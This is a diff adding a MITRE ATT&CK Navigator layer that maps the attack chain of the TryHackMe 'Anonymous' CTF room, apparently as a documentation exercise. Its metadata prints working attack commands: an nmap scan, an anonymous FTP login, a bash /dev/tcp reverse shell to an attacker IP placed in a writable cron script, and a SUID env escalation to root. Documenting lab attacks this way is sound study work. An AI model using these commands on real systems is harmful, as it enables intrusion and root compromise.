@@ -1,0 +1,354 @@
+{
+  "name": "Anonymous - TryHackMe Room",
+  "description": "MITRE ATT&CK Navigator layer mapping for the Anonymous CTF challenge. Shows attack techniques used across reconnaissance, exploitation, and privilege escalation phases.",
+  "versions": {
+    "attack": "18",
+    "navigator": "5.2.0",
+    "layer": "4.5"
+  },
+  "domain": "enterprise-attack",
+  "filters": {
+    "platforms": [
+      "Linux",
+      "ESXi",
+      "PRE"
+    ]
+  },
+  "sorting": 0,
+  "layout": {
+    "layout": "side",
+    "aggregateFunction": "average",
+    "showID": false,
+    "showName": true,
+    "showAggregateScores": false,
+    "countUnscored": false,
+    "expandedSubtechniques": "annotated"
+  },
+  "hideDisabled": false,
+  "techniques": [
+    {
+      "techniqueID": "T1592",
+      "tactic": "reconnaissance",
+      "color": "",
+      "comment": "Gather Victim Host Information - Port scanning and service enumeration",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Phase",
+          "value": "Reconnaissance"
+        },
+        {
+          "name": "Tools",
+          "value": "Nmap, FTP Client"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1592.002",
+      "tactic": "reconnaissance",
+      "color": "#e60d0d",
+      "comment": "Gather Victim Host Information: Software - Service version enumeration (vsftpd 3.0.3, OpenSSH 7.6p1, Samba 4.7.6)",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Impact",
+          "value": "High - Identified anonymous FTP vulnerability"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1592.004",
+      "tactic": "reconnaissance",
+      "color": "#e60d0d",
+      "comment": "Gather Victim Host Information: Client Configurations - Discovered world-writable FTP directory structure",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Discovery Method",
+          "value": "FTP directory listing and permission enumeration"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1595",
+      "tactic": "reconnaissance",
+      "color": "",
+      "comment": "Active Scanning - Port scanning and service detection",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Phase",
+          "value": "Initial Reconnaissance"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1595.001",
+      "tactic": "reconnaissance",
+      "color": "#e60d0d",
+      "comment": "Active Scanning: Scanning IP Blocks - Nmap aggressive scan on target IP 10.201.29.134",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Command",
+          "value": "nmap -A 10.201.29.134"
+        },
+        {
+          "name": "Result",
+          "value": "4 open ports identified: FTP(21), SSH(22), NetBIOS(139,445)"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1595.002",
+      "tactic": "reconnaissance",
+      "color": "#e60d0d",
+      "comment": "Active Scanning: Vulnerability Scanning - Service version enumeration for vulnerability assessment",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Services Scanned",
+          "value": "FTP, SSH, SMB"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1190",
+      "tactic": "initial-access",
+      "color": "#e60d0d",
+      "comment": "Exploit Public-Facing Application - Anonymous FTP access enabled on vsftpd 3.0.3",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Vulnerability",
+          "value": "Anonymous FTP login without authentication"
+        },
+        {
+          "name": "Impact",
+          "value": "Critical - Exposed scripts directory with world-writable permissions"
+        },
+        {
+          "name": "Attack Vector",
+          "value": "ftp 10.201.29.134 with 'ftp' user and blank password"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1053",
+      "tactic": "execution",
+      "color": "",
+      "comment": "Scheduled Task/Job - Cron job execution mechanism for clean.sh script",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Phase",
+          "value": "Exploitation"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1053.003",
+      "tactic": "execution",
+      "color": "#e60d0d",
+      "comment": "Scheduled Task/Job: Cron - Malicious reverse shell executed via modified cron script",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Exploitation Method",
+          "value": "Replaced clean.sh with reverse shell payload: bash -i >& /dev/tcp/10.17.19.104/4444 0>&1"
+        },
+        {
+          "name": "Result",
+          "value": "Reverse shell obtained as 'namelessone' user on Netcat listener port 4444"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1053.003",
+      "tactic": "persistence",
+      "color": "#e60d0d",
+      "comment": "Scheduled Task/Job: Cron - Persistent backdoor via cron job modification",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Persistence Mechanism",
+          "value": "Modified world-writable script executed by cron daemon"
+        },
+        {
+          "name": "Privilege Level",
+          "value": "Executed with cron job owner privileges (namelessone)"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1053.003",
+      "tactic": "privilege-escalation",
+      "color": "#e60d0d",
+      "comment": "Scheduled Task/Job: Cron - Used as vector for code execution with elevated context",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Elevation Source",
+          "value": "World-writable script in cron execution path"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1105",
+      "tactic": "command-and-control",
+      "color": "#e60d0d",
+      "comment": "Ingress Tool Transfer - Reverse shell communication over TCP connection",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "C2 Channel",
+          "value": "TCP reverse shell 10.17.19.104:4444"
+        },
+        {
+          "name": "Protocol",
+          "value": "/dev/tcp bash reverse shell"
+        },
+        {
+          "name": "Direction",
+          "value": "Outbound from target to attacker's Netcat listener"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1548",
+      "tactic": "privilege-escalation",
+      "color": "",
+      "comment": "Abuse Elevation Control Mechanism - SUID binary exploitation for privilege escalation",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Phase",
+          "value": "Post-Exploitation Privilege Escalation"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": true
+    },
+    {
+      "techniqueID": "T1548.001",
+      "tactic": "privilege-escalation",
+      "color": "#e60d0d",
+      "comment": "Abuse Elevation Control Mechanism: Setuid and Setgid - Exploited /usr/bin/env SUID binary",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Vulnerable Binary",
+          "value": "/usr/bin/env with SUID bit set"
+        },
+        {
+          "name": "Exploitation Command",
+          "value": "/usr/bin/env /bin/sh -p"
+        },
+        {
+          "name": "Result",
+          "value": "Root shell obtained; UID=0(root) privileges gained"
+        },
+        {
+          "name": "Reference",
+          "value": "GTFOBins - https://gtfobins.github.io/gtfobins/env/"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1548.001",
+      "tactic": "defense-evasion",
+      "color": "#e60d0d",
+      "comment": "Abuse Elevation Control Mechanism: Setuid and Setgid - Used -p flag to preserve privileges",
+      "enabled": true,
+      "metadata": [
+        {
+          "name": "Defense Evasion Technique",
+          "value": "Used -p flag in /bin/sh to maintain elevated privileges from SUID execution"
+        },
+        {
+          "name": "Impact",
+          "value": "Bypassed privilege restrictions to execute commands as root"
+        }
+      ],
+      "links": [],
+      "showSubtechniques": false
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#ff6666ff",
+      "#ffe766ff",
+      "#8ec843ff"
+    ],
+    "minValue": 0,
+    "maxValue": 100
+  },
+  "legendItems": [
+    {
+      "label": "Red (#e60d0d) = Actively Exploited",
+      "color": "#e60d0d"
+    },
+    {
+      "label": "Yellow = Enumeration Phase",
+      "color": "#ffe766ff"
+    },
+    {
+      "label": "Green = Successful Exploitation",
+      "color": "#8ec843ff"
+    }
+  ],
+  "metadata": [
+    {
+      "name": "Challenge",
+      "value": "TryHackMe - Anonymous"
+    },
+    {
+      "name": "Difficulty",
+      "value": "Medium"
+    },
+    {
+      "name": "Target IP",
+      "value": "10.201.29.134"
+    },
+    {
+      "name": "Date Completed",
+      "value": "2025-10-17"
+    },
+    {
+      "name": "Attack Chain",
+      "value": "Reconnaissance -> Anonymous FTP Access -> Script Manipulation -> Reverse Shell -> SUID Exploitation -> Root Access"
+    }
+  ],
+  "links": [],
+  "showTacticRowBackground": false,
+  "tacticRowBackground": "#dddddd",
+  "selectTechniquesAcrossTactics": true,
+  "selectSubtechniquesWithParent": false,
+  "selectVisibleTechniques": false
+}
